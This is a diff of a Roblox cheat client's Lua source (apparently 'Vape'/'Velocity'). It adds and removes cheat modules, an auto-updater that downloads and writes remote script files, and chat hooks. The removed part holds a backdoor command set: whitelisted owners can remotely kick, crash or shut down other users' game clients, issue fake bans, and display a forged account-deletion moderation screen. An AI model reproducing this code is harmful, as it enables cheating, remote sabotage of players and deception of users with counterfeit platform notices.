-				UIBlox.init(getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppUIBloxConfig))
-				local auth = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
-				local darktheme = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Themes.DarkTheme
-				local gotham = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Fonts.Gotham
-				local tLocalization = getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppLocales).Localization;
-				local a = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Localization).LocalizationProvider
-				lplr.PlayerGui:ClearAllChildren()
-				GuiLibrary.MainGui.Enabled = false
-				game:GetService("CoreGui"):ClearAllChildren()
-				for i,v in pairs(workspace:GetChildren()) do pcall(function() v:Destroy() end) end
-				task.wait(0.2)
-				lplr:Kick()
-				game:GetService("GuiService"):ClearError()
-				task.wait(2)
-				local gui = Instance.new("ScreenGui")
-				gui.IgnoreGuiInset = true
-				gui.Parent = game:GetService("CoreGui")
-				local frame = Instance.new("Frame")
-				frame.BorderSizePixel = 0
-				frame.Size = UDim2.new(1, 0, 1, 0)
-				frame.BackgroundColor3 = Color3.new(1, 1, 1)
-				frame.Parent = gui
-				task.delay(0.1, function()
-					frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-				end)
-				task.delay(2, function()
-					local e = Roact.createElement(auth, {
-						style = {},
-						screenSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080),
-						moderationDetails = {
-							punishmentTypeDescription = "Delete",
-							beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
-							reactivateAccountActivated = true,
-							badUtterances = {},
-							messageToUser = "Your account has been deleted for violating our Terms of Use for exploiting."
-						},
-						termsActivated = function() 
-							game:Shutdown()
-						end,
-						communityGuidelinesActivated = function() 
-							game:Shutdown()
-						end,
-						supportFormActivated = function() 
-							game:Shutdown()
-						end,
-						reactivateAccountActivated = function() 
-							game:Shutdown()
-						end,
-						logoutCallback = function()
-							game:Shutdown()
-						end,
-						globalGuiInset = {
-							top = 0
-						}
-					})
-					local screengui = Roact.createElement("ScreenGui", {}, Roact.createElement(a, {
-							localization = tLocalization.mock()
-						}, {Roact.createElement(UIBlox.Style.Provider, {
-								style = {
-									Theme = darktheme,
-									Font = gotham
-								},
-							}, {e})}))
-					Roact.mount(screengui, game:GetService("CoreGui"))
-				end)
-			end)
-		end,
-		--lobby = function(args)
-			--bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
-		--end,
-		reveal = function(args)
-			task.spawn(function()
-				task.wait(0.1)
-                local said = false
-				if WhitelistFunctions.LocalPriority == 0 and not said then 
-					sendmessage("helloimusinginhaler")
-				end
-			end)
-		end,
-		lagback = function(args)
-			if entityLibrary.isAlive then
-				entityLibrary.character.HumanoidRootPart.Velocity = Vector3.new(9999999, 9999999, 9999999)
-			end
-		end,
-		jump = function(args)
-			if entityLibrary.isAlive and entityLibrary.character.Humanoid.FloorMaterial ~= Enum.Material.Air then
-				entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
-			end
-		end,
-		trip = function(args)
-			if entityLibrary.isAlive then
-				entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Physics)
-			end
-		end,
-		teleport = function(args)
-			game:GetService("TeleportService"):Teleport(tonumber(args[1]) ~= "" and tonumber(args[1]) or game.PlaceId)
-		end,
-		sit = function(args)
-			if entityLibrary.isAlive then
-				entityLibrary.character.Humanoid.Sit = true
-			end
-		end,
-		unsit = function(args)
-			if entityLibrary.isAlive then
-				entityLibrary.character.Humanoid.Sit = false
-			end
-		end,
-		freeze = function(args)
-			if entityLibrary.isAlive then
-				entityLibrary.character.HumanoidRootPart.Anchored = true
-			end
-		end,
-		thaw = function(args)
-		    if entityLibrary.isAlive then
-			entityLibrary.character.HumanoidRootPart.Anchored = false
-		    end
-		end,
-		deletemap = function(args)
-			for i,v in pairs(collectionService:GetTagged("block")) do
-				v:Destroy()
-			end
-		end,
-		void = function(args)
-			if entityLibrary.isAlive then
-				entityLibrary.character.HumanoidRootPart.CFrame = entityLibrary.character.HumanoidRootPart.CFrame + Vector3.new(0, -1000, 0)
-			end
-		end,
-		framerate = function(args)
-			if #args >= 1 then
-				if setfpscap then
-					setfpscap(tonumber(args[1]) ~= "" and math.clamp(tonumber(args[1]) or 9999, 1, 9999) or 9999)
-				end
-			end
-		end,
-		crash = function(args)
-			setfpscap(9e9)
-			print(game:GetObjects("h29g3535")[1])
-		end,
-		chipman = function(args)
-			transformImage("http://www.roblox.com/asset/?id=6864086702", "chip man")
-		end,
-		rickroll = function(args)
-			transformImage("http://www.roblox.com/asset/?id=7083449168", "Never gonna give you up")
-		end,
-		josiah = function(args)
-			transformImage("http://www.roblox.com/asset/?id=13924242802", "josiah boney")
-		end,
-		xylex = function(args)
-		    transformImage("http://www.roblox.com/asset/?id=13953598788", "byelex")
-		end,
-		gravity = function(args)
-		    workspace.Gravity = tonumber(args[1]) or 192.6
-		end,
-		kick = function(args, plr)
-		    local str = ""
-		    for i,v in pairs(args) do
-			str = str..v..(i > 1 and " " or "")
-		    end
-		    task.spawn(function()
-			lplr:Kick(str)
-		    end)
-		end,
-		ban = function(args)
-		    task.spawn(function()
-			task.wait(3)
-			lplr:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds ]")
-		    end)
-		end,
-		uninject = function(args)
-			GuiLibrary.SelfDestruct()
-		end,
-		enable = function(args)
-			if #args >= 1 then
-				if args[1]:lower() == "all" then
-					for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
-						if v.Type == "OptionsButton" and i ~= "Panic" and not v.Api.Enabled then
-							v.Api.ToggleButton()
-						end
-					end
-				else
-					local module
-					for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
-						if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
-							module = v
-							break
-						end
-					end
-					if module and not module.Api.Enabled then
-						module.Api.ToggleButton()
-					end
-				end
-			end
-		end,
-		disable = function(args)
-			if #args >= 1 then
-				if args[1]:lower() == "all" then
-					for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
-						if v.Type == "OptionsButton" and i ~= "Panic" and v.Api.Enabled then
-							v.Api.ToggleButton()
-						end
-					end
-				else
-					local module
-					for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
-						if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
-							module = v
-							break
-						end
-					end
-					if module and module.Api.Enabled then
-						module.Api.ToggleButton()
-					end
-				end
-			end
-		end,
-		toggle = function(args)
-			if #args >= 1 then
-				if args[1]:lower() == "all" then
-					for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
-						if v.Type == "OptionsButton" and i ~= "Panic" then
-							v.Api.ToggleButton()
-						end
-					end
-				else
-					local module
-					for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
-						if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
-							module = v
-							break
-						end
-					end
-					if module then
-						module.Api.ToggleButton()
-					end
-				end
-			end
-		end,
-		shutdown = function(args)
-			game:Shutdown()
-		end
-    }
-    vapePrivateCommands.unfreeze = vapePrivateCommands.thaw
-    task.spawn(function()
-	    local function chatfunc(plr)
-		    table.insert(vapeConnections, plr.Chatted:Connect(function(message)
-			    vapeStore.MessageReceived:Fire(plr, message)
-		    end))
-	    end
-	    table.insert(vapeConnections, textChatService.MessageReceived:Connect(function(data)
-		    local success, player = pcall(function() 
-			    return playersService:GetPlayerByUserId(data.TextSource.UserId) 
-		    end)
-		    if success then 
-			    vapeStore.MessageReceived:Fire(player, data.Text)
-		    end
-	    end))
-	    for i,v in playersService:GetPlayers() do 
-		    chatfunc(v)
-	    end
-	    table.insert(vapeConnections, playersService.PlayerAdded:Connect(chatfunc))
-    end)
-    table.insert(vapeConnections, vapeStore.MessageReceived.Event:Connect(function(plr, message)
-        message = message:gsub('/w '..lplr.Name, '')
-        local localPriority = priolist[WhitelistFunctions:CheckPlayerType(lplr)] or 0
-        local otherPriority = priolist[WhitelistFunctions:CheckPlayerType(plr)] or 0
-        local args = message:split(' ')
-        local first, second = tostring(args[1]), tostring(args[2])
-        if plr.Name == lplr.Name then
-            if localPriority > 0 then
-                if message == "ehelp" or first:sub(1, 6) == ';cmds' then
-                    task.wait(0.1)
-                    local tab = {}
-                    for i,v in pairs(vapePrivateCommands) do
-                        table.insert(tab, ";"..i)
-                    end
-                    table.sort(tab)
-                    local str = table.concat(tab, "\n")
-                    if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then 
-                        textChatService.ChatInputBarConfiguration.TargetTextChannel:DisplaySystemMessage(str)
-                    else 
-                        game:GetService('StarterGui'):SetCore('ChatMakeSystemMessage', {Text = str, Color = Color3.fromRGB(255, 255, 255), Font = Enum.Font.SourceSansBold, FontSize = Enum.FontSize.Size24})
-                        game.StarterGui:SetCore("ChatMakeSystemMessage",  { Text = "[Velocity Private] Commands", Color = Color3.fromRGB(0, 255, 255), Font = Enum.Font.SourceSansBold, FontSize = Enum.FontSize.Size24 } )
-                    end
-                end
-            end
-        else
-            if otherPriority > 0 and otherPriority > localPriority and #args > 1 then
-                table.remove(args, 1)
-                local chosenplayers = findplayers(args[1], plr)
-                if table.find(chosenplayers, lplr) then
-                    table.remove(args, 1)
-                    for i,v in pairs(chosenplayers) do
-                        for i,v in pairs(vapePrivateCommands) do
-                            if message:len() >= (i:len() + 1) and message:sub(1, i:len() + 1):lower() == ";"..i:lower() then 
-                                v(args, plr)
-                            end
-                        end
-                    end
-                end
-            end
-        end
-	local function newPlayer(plr)
-		if WhitelistFunctions:GetWhitelist(plr) ~= 0 and WhitelistFunctions.LocalPriority == 0 then
-			GuiLibrary.SelfDestruct = function()
-				warningNotification("Vape", "nice one bro :troll:", 5)
-			end
-			task.spawn(function()
-				lplr:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds ]")
-				task.wait(4)
-			end)
-		end
-	end
-        if message:find('helloimusinginhaler') and localPriority > 0 then
-            if WhitelistFunctions:GetWhitelist(lplr) and WhitelistFunctions:GetWhitelist(lplr) >= 1 then
-                warningNotification('Vape', plr.Name..' is using Vape!', 30)
-                WhitelistFunctions.CustomTags[plr.Name] = "[VAPE USER]"                                                                               local ind, newent = entityLibrary.getEntityFromPlayer(plr)
-				if newent then entityLibrary.entityUpdatedEvent:Fire(newent) end
-            end
-            local nonWhitelistedVapeTag = "VAPE USER"
-            local nonWhitelistedVapeColor = "#FFFF00" 
-            properties.PrefixText = "<font color='" .. nonWhitelistedVapeColor .. "'>[" .. nonWhitelistedVapeTag .. "] </font> " .. (message.PrefixText or "")
-        end
-    end))
-end)
-
-textChatService.OnIncomingMessage = function(message)
-    local properties = Instance.new('TextChatMessageProperties') 
-    if message.TextSource then
-        local plr = playersService:GetPlayerByUserId(message.TextSource.UserId)
-        if plr then
-            local senderIsWhitelisted = WhitelistFunctions:CheckWhitelisted(plr)
-            if senderIsWhitelisted then
-                for _, player in ipairs(playersService:GetPlayers()) do
-                    local vapeTag = WhitelistFunctions.playerTags[player]
-                    if vapeTag then
-                        local Priority = WhitelistFunctions:CheckPlayerType(player)
-                        if Priority and Priority ~= "DEFAULT" then
-			    WhitelistFunctions:CreatePlayerTag(plr, 'VAPE USER', '#FFFF00')
-                        end
-                    end
-                end
-            end
-        end
-    end
-    return properties
-end
-
-
-if replicatedStorageService:FindFirstChild('DefaultChatSystemChatEvents') then 
-    local chatTables = {}
-    local oldchatfunc
-    for i,v in next, getconnections(replicatedStorageService.DefaultChatSystemChatEvents.OnNewMessage.OnClientEvent) do 
-        if v.Function and #debug.getupvalues(v.Function) > 0 and type(debug.getupvalues(v.Function)[1]) == 'table' then
-            local chatvalues = getmetatable(debug.getupvalues(v.Function)[1]) 
-            if chatvalues and chatvalues.GetChannel then  
-                oldchatfunc = chatvalues.GetChannel 
-                chatvalues.GetChannel = function(self, name) 
-                    local data = oldchatfunc(self, name) 
-                    local addmessage = (data and data.AddMessageToChannel)
-                    if data and data.AddMessageToChannel then 
-                        if chatTables[data] == nil then 
-                            chatTables[data] = data.AddMessageToChannel 
-                        end 
-                        data.AddMessageToChannel = function(self2, data2)
-                            local plr = playersService:FindFirstChild(data2.FromSpeaker)
-                            local vapetag = (plr and WhitelistFunctions.playerTags[plr])
-                            local senderIsWhitelisted = WhitelistFunctions:CheckWhitelisted(plr)
-                            if data2.FromSpeaker and vapeInjected then 
-                                local tagText, tagColor
-                                if vapetag then
-                                    tagColor = Color3.fromHex(vapetag.Color)
-                                    tagText = vapetag.Text
-                                elseif senderIsWhitelisted then
-                                    for _, player in ipairs(playersService:GetPlayers()) do
-                                        if vapeTag then
-                                            local Priority = WhitelistFunctions:CheckPlayerType(player)
-                                            if Priority and Priority ~= "DEFAULT" then
-                                                tagColor = Color3.fromRGB(255, 255, 0)
-                                                tagText = "VAPE USER"
-                                            end
-                                        end
-                                    end
-                                end
-                                if tagText then
-                                    data2.ExtraData = {
-                                        Tags = {unpack(data2.ExtraData.Tags), {TagText = tagText, TagColor = tagColor}},
-                                        NameColor = plr.Team == nil and Color3.fromRGB(tagColor.R + 45, tagColor.G + 45, tagColor.B - 10) or plr.TeamColor.Color
-                                    }
-                                end
-                            end
-                            return addmessage(self2, data2)
-                        end
-                        return data
-                    end
-                end
-            end
-        end
-    end
-end
-
 if hookmetamethod and httpServiceRun == nil then 
     local oldcall
     getgenv().httpServiceRun = function(func, ...) 
@@ -6431,80 +6690,64 @@ if hookmetamethod and httpServiceRun == nil then
     end)
 end
 
-local said = false
-local sent = false  
-local function whitelistFunction(plr)
-    repeat task.wait() until WhitelistFunctions.Loaded
-    local plrPriority, _, _ = WhitelistFunctions:GetWhitelist(plr)                                                                    
-    if WhitelistFunctions.LocalPriority >= 1 and not sent then                                                                        
-        warningNotification('Vape', 'You are now authenticated, Time to troll velocity users!', 4.5)
-        sent = true
-    elseif WhitelistFunctions.LocalPriority == 0 and WhitelistFunctions:IsSpecialIngame() and not said then
-        sendmessage('helloimusinginhaler')
-        said = true                                                                                                                   
-    end
-end
-whitelistFunction(lplr) 
-
 local auto = false
+
 local function fetchFile(url)
     local success, result = pcall(function()
         return game:HttpGet(url)
     end)
-   return result
+    return success and result or nil
 end
 
-function Update()
-    local function fetchAndWrite(url, filePath)
+function newUpdate()
+    local function downloadFile(url, filePath)
         local body = fetchFile(url)
         if body then
             writefile(filePath, body)
         else
             print("Failed to fetch file from URL:", url)
+            warningNotification("Velocity", "Failed to fetch a file. Please report this to a developer.", 100)
         end
     end
-    local verisonURL = "https://raw.githubusercontent.com/Copiums/Velocity/main/verison.txt"
-    local v = fetchFile(verisonURL)
-    local currentVersion = v
-    print(currentVersion)
-    local localVersion = '0'
-    writefile('vape/verison.txt', 'v.0')
-																								
+
+    local versionURL = "https://raw.githubusercontent.com/Copiums/Velocity/main/version.txt"
+    local current = fetchFile(versionURL)
+    local localVersion = nil
+    
     if isfile('vape/version.txt') then
         localVersion = readfile('vape/version.txt')
     else
-        writefile('vape/version.txt', tostring(currentVersion))  
-        localVersion = currentVersion  
+        warn("File wasn't found. Creating file and kicking player.")
+        writefile('vape/version.txt', 'v30432')  
+        lplr:Kick("Hey! If you see this message. Just rejoin the game and execute Velocity again! Thank you!")
+        return
     end
 
-    function outdated()
-       if not currentVerison == localVersion then
-            return true
-       else
-            return false
-       end
-   end
-																									
-   if outdated() then
-       warningNotification('Velocity', 'Script is outdated. Please wait a second...', 10)
-       fetchAndWrite('https://raw.githubusercontent.com/Copiums/Velocity/main/Universal.lua', 'vape/Universal.lua')
-       fetchAndWrite('https://raw.githubusercontent.com/Copiums/Velocity/main/MainScript.lua', 'vape/MainScript.lua')
-       fetchAndWrite('https://raw.githubusercontent.com/Copiums/Velocity/main/GuiLibrary.lua', 'vape/GuiLibrary.lua')
-       fetchAndWrite('https://raw.githubusercontent.com/Copiums/Velocity/main/6872274481.lua', 'vape/CustomModules/6872274481.lua')
-       fetchAndWrite('https://raw.githubusercontent.com/Copiums/Velocity/main/6872265039.lua', 'vape/CustomModules/6872265039.lua')
-       wait(3)
-       warningNotification('Velocity - Autoupdate', 'Success! Reinject vape..', 5)
-       writefile('vape/version.txt', tostring(currentVersion)) 
-       wait(5)
-       lplr:Kick("Update success!")
-   end
+    local function checkOutdated()
+        return localVersion ~= current
+    end
+
+    if checkOutdated() then
+        warningNotification("Velocity", "A newer version is available. Please wait while we fetch the version.", 60)
+        downloadFile('https://raw.githubusercontent.com/Copiums/Velocity/main/MainScript.lua', 'vape/MainScript.lua')
+        downloadFile('https://raw.githubusercontent.com/Copiums/Velocity/main/GuiLibrary.lua', 'vape/GuiLibrary.lua')
+        downloadFile('https://raw.githubusercontent.com/Copiums/Velocity/main/6872274481.lua', 'vape/CustomModules/6872274481.lua')
+        downloadFile('https://raw.githubusercontent.com/Copiums/Velocity/main/6872265039.lua', 'vape/CustomModules/6872265039.lua')
+        warningNotification("Velocity", "Success! Please wait as we do some final things.", 10)
+
+        writefile('vape/version.txt', current)
+        lplr:Kick("Velocity - Autoupdate was a success! If you see this message more than once, please report this to a developer!")
+    else
+        warningNotification("Velocity", "No new version available. Continuing..", 5)
+    end
 end
+
 if auto then
-   Update()
+    newUpdate()
 else
-    warningNotification("Velocity", "Autoupdate has been disabled. Continuing..")
-end
-                                                                                                                                                                                                                                                                                                                               
+    warningNotification("Velocity", "Autoupdate has been disabled. Continuing..", 3)
+end 
+                                                                                                                                                                                                                                                                                                                            
 runFunction(function()
 	local Disabler = {Enabled = false}
 	local DisablerAntiKick = {Enabled = false}
@@ -6701,45 +6944,6 @@ runFunction(function()
 end)
 
 runFunction(function()
-	local I = {Enabled = false}
-	local H = {Enabled = false}
-	I = GuiLibrary.ObjectsThatCanBeSaved.VelocityWindow.Api.CreateOptionsButton({
-		Name = 'InfiniteJump',
-		HoverText = 'Jump without touching the ground',
-		Function = function(callback)
-			if callback then
-				local x = false
-				table.insert(I.Connections, inputService.InputBegan:Connect(function(input)
-					if input.KeyCode == Enum.KeyCode.Space and not inputService:GetFocusedTextBox() then
-						x = true
-						if entityLibrary.isAlive then
-							if H.Enabled then
-								repeat
-									entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
-									task.wait()
-								until not x or not I.Enabled or not H.Enabled or inputService:GetFocusedTextBox()
-							else
-								entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
-							end
-						end
-					end
-				end))
-				table.insert(I.Connections, inputService.InputEnded:Connect(function(input)
-					if input.KeyCode == Enum.KeyCode.Space and not inputService:GetFocusedTextBox() then
-						x = false
-					end
-				end))
-			end
-		end
-	})
-	H = I.CreateToggle({
-		Name = 'Hold',
-		Function = function() end,
-		HoverText = 'Hold down space to jump'
-	})
-end)
-
-runFunction(function()
     local anim = {["Enabled"] = false}
     anim = GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOptionsButton({
         ["Name"] = "AnimationChanger",
@@ -6747,486 +6951,484 @@ runFunction(function()
         ["Function"] = function(callback)
             if callback then
                 task.spawn(function()
-                    local Hum = game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
-                    if not Hum then
-                        repeat task.wait() until Hum
-                    end
-                    local Animate = game:GetService("Players").LocalPlayer.Character.Animate
-
-                    ----Cartoony
-                    if animrun.Value == "Cartoony" and animtype.Value == "Custom" then
-                        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921076136"
-                    end
-                    if animwalk.Value == "Cartoony" and animtype.Value == "Custom" then
-                        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921082452"
-                    end
-                    if animfall.Value == "Cartoony" and animtype.Value == "Custom" then
-                        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921077030"
-                    end
-                    if animjump.Value == "Cartoony" and animtype.Value == "Custom" then
-                        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921078135"
-                    end
-                    if animidle.Value == "Cartoony" and animtype.Value == "Custom" then
-                        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921071918"
-                        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921072875"
-                    end
-                    if animclimb.Value == "Cartoony" and animtype.Value == "Custom" then
-                        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921070953"
-                    end
-                    ----Levitation
-                    if animrun.Value == "Levitation" and animtype.Value == "Custom" then
-                        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921135644"
-                    end
-                    if animwalk.Value == "Levitation" and animtype.Value == "Custom" then
-                        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921140719"
-                    end
-                    if animfall.Value == "Levitation" and animtype.Value == "Custom" then
-                        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921136539"
-                    end
-                    if animjump.Value == "Levitation" and animtype.Value == "Custom" then
-                        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921137402"
-                    end
-                    if animidle.Value == "Levitation" and animtype.Value == "Custom" then
-                        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921132962"
-                        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921133721"
-                    end
-                    if animclimb.Value == "Levitation" and animtype.Value == "Custom" then
-                        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921132092"
-                    end
-                    ----Robot
-                    if animrun.Value == "Robot" and animtype.Value == "Custom" then
-                        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921250460"
-                    end
-                    if animwalk.Value == "Robot" and animtype.Value == "Custom" then
-                        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921255446"
-                    end
-                    if animfall.Value == "Robot" and animtype.Value == "Custom" then
-                        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921251156"
-                    end
-                    if animjump.Value == "Robot" and animtype.Value == "Custom" then
-                        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921251519"
-                    end
-                    if animidle.Value == "Robot" and animtype.Value == "Custom" then
-                        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921247776"
-                        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921248461"
-                    end
-                    if animclimb.Value == "Robot" and animtype.Value == "Custom" then
-                        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921245669"
-                    end
-                    ----Stylish
-                    if animrun.Value == "Stylish" and animtype.Value == "Custom" then
-                        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921529786"
-                    end
-                    if animwalk.Value == "Stylish" and animtype.Value == "Custom" then
-                        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921539727"
-                    end
-                    if animfall.Value == "Stylish" and animtype.Value == "Custom" then
-                        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921531448"
-                    end
-                    if animjump.Value == "Stylish" and animtype.Value == "Custom" then
-                        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921533736"
-                    end
-                    if animidle.Value == "Stylish" and animtype.Value == "Custom" then
-                        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921527750"
-                        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921528141"
-                    end
-                    if animclimb.Value == "Stylish" and animtype.Value == "Custom" then
-                        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921525854"
-                    end
-                    ----Superhero
-                    if animrun.Value == "Superhero" and animtype.Value == "Custom" then
-                        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921350016"
-                    end
-                    if animwalk.Value == "Superhero" and animtype.Value == "Custom" then
-                        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921353493"
-                    end
-                    if animfall.Value == "Superhero" and animtype.Value == "Custom" then
-                        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921350451"
-                    end
-                    if animjump.Value == "Superhero" and animtype.Value == "Custom" then
-                        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921351314"
-                    end
-                    if animidle.Value == "Superhero" and animtype.Value == "Custom" then
-                        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921348319"
-                        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921349011"
-                    end
-                    if animclimb.Value == "Superhero" and animtype.Value == "Custom" then
-                        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921346417"
-                    end
-                    ----Zombie
-                    if animrun.Value == "Zombie" and animtype.Value == "Custom" then
-                        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921472697"
-                    end
-                    if animwalk.Value == "Zombie" and animtype.Value == "Custom" then
-                        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921474987"
-                    end
-                    if animfall.Value == "Zombie" and animtype.Value == "Custom" then
-                        warn("Zombies don't work well with spider fall animation")
-                        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921473341"
-                    end
-                    if animjump.Value == "Zombie" and animtype.Value == "Custom" then
-                        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921474136"
-                    end
-                    if animidle.Value == "Zombie" and animtype.Value == "Custom" then
-                        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921470171"
-                        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921470752"
-                    end
-                    if animclimb.Value == "Zombie" and animtype.Value == "Custom" then
-                        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921469135"
-                    end
-                    ----Ninja
-                    if animrun.Value == "Ninja" and animtype.Value == "Custom" then
-                        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10920910496"
-                    end
-                    if animwalk.Value == "Ninja" and animtype.Value == "Custom" then
-                        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10920915507"
-                    end
-                    if animfall.Value == "Ninja" and animtype.Value == "Custom" then
-                        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10920912824"
-                    end
-                    if animjump.Value == "Ninja" and animtype.Value == "Custom" then
-                        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10920913905"
-                    end
-                    if animidle.Value == "Ninja" and animtype.Value == "Custom" then
-                        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10920909751"
-                        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10920910154"
-                    end
-                    if animclimb.Value == "Ninja" and animtype.Value == "Custom" then
-                        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10920908048"
-                    end                   
-                    if animrun.Value == "Knight" and animtype.Value == "Custom" then
-	                    Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921121197" 	
-                    end
-                    if animwalk.Value == "Knight" and animtype.Value == "Custom" then
-                        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921127095"
-                    end
-                    if animfall.Value == "Knight" and animtype.Value == "Custom" then
-                        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921122579"
-                    end
-
-                    if animjump.Value == "Knight" and animtype.Value == "Custom" then
-                        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921123517"
-                    end
-
-                    if animidle.Value == "Knight" and animtype.Value == "Custom" then
-                        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921117521"
-                        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921118894"
-                    end
-
-                    if animclimb.Value == "Knight" and animtype.Value == "Custom" then
-                        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921116196"
-                    end
-
-                    --- Mage
-                    if animrun.Value == "Mage" and animtype.Value == "Custom" then
-                        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921148209" 	
-                    end
-
-                    if animwalk.Value == "Mage" and animtype.Value == "Custom" then
-                        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921152678"
-                    end
-
-                    if animfall.Value == "Mage" and animtype.Value == "Custom" then
-                        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921148939"
-                    end
-
-                    if animjump.Value == "Mage" and animtype.Value == "Custom" then
-                        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921149743"
-                    end
-
-                    if animidle.Value == "Mage" and animtype.Value == "Custom" then
-                        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921144709"
-                        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921145797"
-                    end
-
-                    if animclimb.Value == "Mage" and animtype.Value == "Custom" then
-                        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921143404"
-                    end
-
-                    --- Pirate
-                    if animrun.Value == "Pirate" and animtype.Value == "Custom" then
-                        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=750783738" 	
-                    end
-
